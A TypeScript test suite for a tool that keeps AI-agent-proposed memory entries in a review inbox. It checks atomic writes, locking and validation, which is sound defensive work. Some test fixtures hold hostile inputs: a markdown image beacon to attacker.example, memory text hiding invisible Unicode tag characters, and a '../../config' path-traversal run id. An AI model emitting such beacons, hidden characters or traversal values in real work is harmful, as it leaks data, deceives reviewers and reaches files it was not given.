import { spawnSync } from "node:child_process";
import { mkdir, readdir, readFile, utimes, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { readJsonFile, writeFileAtomic } from "../src/fsx.js";
import { renderRunMarkdown } from "../src/inbox/render.js";
import { RunRecordSchema, type RunRecord } from "../src/inbox/schema.js";
import { loadRuns, recordDecisions, saveRun } from "../src/inbox/store.js";
import { withLock } from "../src/lock.js";
import { StateSchema } from "../src/state.js";
import { makeSandbox, type Sandbox } from "./helpers/sandbox.js";

const record = (overrides: Partial<RunRecord> = {}): RunRecord => ({
  schemaVersion: 1,
  runId: "20261101-020000-abcd",
  createdAt: "2026-11-01T02:00:00.000Z",
  memoryDir: "/m",
  agent: { kind: "claude", command: ["claude", "--print"], durationMs: 10 },
  summary: "One fact.",
  sessions: [],
  skipped: [],
  redactions: 0,
  proposals: [
    {
      action: "add",
      id: "20261101-020000-abcd-1",
      file: "a.md",
      name: "a",
      description: "A fact",
      type: "user",
      body: "Body with a ``` fence and\n# a heading",
      reason: "Because.",
      confidence: "low",
      evidence: [{ session: "S1", quote: "line one\nline two", status: "verified" }],
      baseHash: null,
      problems: [],
      status: "pending",
    },
  ],
  ...overrides,
});

describe("storage", () => {
  let sandbox: Sandbox;
  beforeEach(async () => {
    sandbox = await makeSandbox();
  });
  afterEach(async () => {
    await sandbox.cleanup();
  });

  describe("writeFileAtomic", () => {
    it("replaces content in one step and leaves no temp file", async () => {
      const path = join(sandbox.root, "f.txt");
      await writeFileAtomic(path, "one");
      await writeFileAtomic(path, "two");
      expect(await readFile(path, "utf8")).toBe("two");
      expect(await readdir(sandbox.root)).not.toContainEqual(expect.stringContaining(".tmp"));
    });

    it("never shows a concurrent reader a partly written file", async () => {
      const path = join(sandbox.root, "big.txt");
      const before = "a".repeat(2_000_000);
      const after = "b".repeat(2_000_000);
      await writeFileAtomic(path, before);
      const seen = new Set<string>();
      const state = { writing: true };
      const reader = (async () => {
        while (state.writing) {
          const text = await readFile(path, "utf8");
          seen.add(text === before ? "before" : text === after ? "after" : `torn (${text.length} chars)`);
        }
      })();
      for (let i = 0; i < 5; i += 1) await writeFileAtomic(path, i % 2 === 0 ? after : before);
      state.writing = false;
      await reader;
      expect([...seen].filter((s) => s.startsWith("torn"))).toEqual([]);
    });

    it("cleans up its temp file when the target cannot be replaced", async () => {
      const { mkdir } = await import("node:fs/promises");
      const target = join(sandbox.root, "is-a-dir");
      await mkdir(target);
      await expect(writeFileAtomic(target, "x")).rejects.toThrow();
      expect((await readdir(sandbox.root)).filter((n) => n.includes(".tmp"))).toEqual([]);
    });
  });

  describe("readJsonFile", () => {
    it("returns null for a missing file and errors on a corrupt one, naming it", async () => {
      const path = join(sandbox.root, "state.json");
      expect(await readJsonFile(path, StateSchema, "state file")).toBeNull();
      await writeFile(path, '{"version": 2}');
      await expect(readJsonFile(path, StateSchema, "state file")).rejects.toThrow(
        new RegExp(`state file has an invalid shape: ${path}\\n  - version`),
      );
    });
  });

  describe("withLock", () => {
    const lock = () => join(sandbox.root, "run.lock");

    it("holds the lock during the callback and releases it afterwards, even on error", async () => {
      await withLock(lock(), "run", async () => {
        expect(JSON.parse(await readFile(lock(), "utf8"))).toMatchObject({ pid: process.pid, purpose: "run" });
      });
      await expect(withLock(lock(), "run", () => Promise.reject(new Error("boom")))).rejects.toThrow("boom");
      expect((await readdir(sandbox.root)).filter((name) => name.includes("lock"))).toEqual([]);
    });

    const holder = (pid: number, purpose = "run") => JSON.stringify({ pid, purpose, startedAt: "t0", token: "t" });

    it("refuses while a live process holds the lock", async () => {
      await writeFile(lock(), holder(process.pid, "apply"));
      await expect(withLock(lock(), "run", () => Promise.resolve())).rejects.toThrow(
        `another dreaming apply is in progress (pid ${process.pid}, started t0)`,
      );
    });

    it("reclaims a lock left by a process that has exited", async () => {
      const dead = spawnSync(process.execPath, ["-e", "process.exit(0)"]).pid;
      await writeFile(lock(), holder(dead));
      expect(await withLock(lock(), "run", () => Promise.resolve("ran"))).toBe("ran");
      expect((await readdir(sandbox.root)).filter((name) => name.includes("lock"))).toEqual([]);
    });

    it("waits for a reclaim in progress and clears a reclaim marker that was abandoned", async () => {
      const dead = spawnSync(process.execPath, ["-e", "process.exit(0)"]).pid;
      await writeFile(lock(), holder(dead));
      // A fresh marker means someone else is reclaiming: do not touch the lock.
      await writeFile(`${lock()}.reclaim`, "123");
      await expect(withLock(lock(), "run", () => Promise.resolve("ran"))).rejects.toThrow(/could not acquire lock/);
      // An old marker was left by a crash: clear it and carry on.
      const old = new Date(Date.now() - 60_000);
      await utimes(`${lock()}.reclaim`, old, old);
      expect(await withLock(lock(), "run", () => Promise.resolve("ran"))).toBe("ran");
      expect((await readdir(sandbox.root)).filter((name) => name.includes("lock"))).toEqual([]);
    });

    it("never removes a lock that is no longer its own", async () => {
      await withLock(lock(), "run", async () => {
        // Simulate another process replacing the lock while this one runs.
        await writeFile(lock(), holder(process.pid));
      });
      expect(JSON.parse(await readFile(lock(), "utf8"))).toMatchObject({ token: "t" });
    });

    it("does not guess about a lock file it cannot read", async () => {
      await writeFile(lock(), "garbage");
      await expect(withLock(lock(), "run", () => Promise.resolve())).rejects.toThrow(/lock file is unreadable/);
    });
  });

  describe("inbox", () => {
    it("round-trips a run and records decisions in place", async () => {
      await saveRun(sandbox.paths.inbox, record());
      await recordDecisions(sandbox.paths.inbox, [
        { runId: "20261101-020000-abcd", id: "20261101-020000-abcd-1", status: "rejected", at: "t1" },
      ]);
      const [run] = await loadRuns(sandbox.paths.inbox);
      expect(run?.proposals[0]).toMatchObject({ status: "rejected", decidedAt: "t1" });
      expect(await readFile(join(sandbox.paths.inbox, "20261101-020000-abcd.md"), "utf8")).toContain("(rejected)");
    });

    it("refuses an invalid run file instead of skipping it", async () => {
      await saveRun(sandbox.paths.inbox, record());
      await writeFile(join(sandbox.paths.inbox, "20261101-030000-0000.json"), '{"schemaVersion": 1}');
      await expect(loadRuns(sandbox.paths.inbox)).rejects.toThrow(/inbox run file has an invalid shape/);
    });

    it("refuses an inbox file whose memory text hides characters a reviewer cannot see", async () => {
      const tampered = record();
      const proposal = tampered.proposals[0];
      if (proposal?.action !== "add") throw new Error("fixture");
      tampered.proposals[0] = { ...proposal, body: "Prefer small PRs.\u{E0072}\u{E0075}\u{E006E}" };
      await mkdir(sandbox.paths.inbox, { recursive: true });
      await writeFile(join(sandbox.paths.inbox, `${tampered.runId}.json`), JSON.stringify(tampered));
      await expect(loadRuns(sandbox.paths.inbox)).rejects.toThrow(
        /proposals\.0\.body: must not contain control or invisible/,
      );
    });

    it("refuses a decision for a proposal that does not exist", async () => {
      await saveRun(sandbox.paths.inbox, record());
      await expect(
        recordDecisions(sandbox.paths.inbox, [
          { runId: "20261101-020000-abcd", id: "20261101-020000-abcd-9", status: "applied", at: "t" },
        ]),
      ).rejects.toThrow("run 20261101-020000-abcd has no proposal 20261101-020000-abcd-9");
    });

    it("refuses a run id that is not one, so it can never name another file", async () => {
      await expect(
        recordDecisions(sandbox.paths.inbox, [{ runId: "../../config", id: "x-1", status: "rejected", at: "t" }]),
      ).rejects.toThrow("invalid run id: ../../config");
    });

    it("renders agent text inert, so a previewer shows it rather than rendering it", () => {
      const hostile = record({ summary: "![beacon](https://attacker.example/p?d=x) <img src=x>" });
      const proposal = hostile.proposals[0];
      if (proposal?.action !== "add") throw new Error("fixture");
      hostile.proposals[0] = { ...proposal, description: "see ![x](https://attacker.example/i.png) <b>now</b>" };
      const markdown = renderRunMarkdown(hostile);
      expect(markdown).toContain("```text\n![beacon](https://attacker.example/p?d=x) <img src=x>\n```");
      expect(markdown).toContain(
        "- Description: see \\!\\[x\\]\\(https://attacker.example/i.png\\) \\<b\\>now\\</b\\>",
      );
      expect(markdown).toContain("````markdown\nBody with a ``` fence and\n# a heading\n````");
      expect(markdown).toContain("```text\nline one\nline two\n```");
      expect(RunRecordSchema.safeParse(record()).success).toBe(true);
    });
  });
});
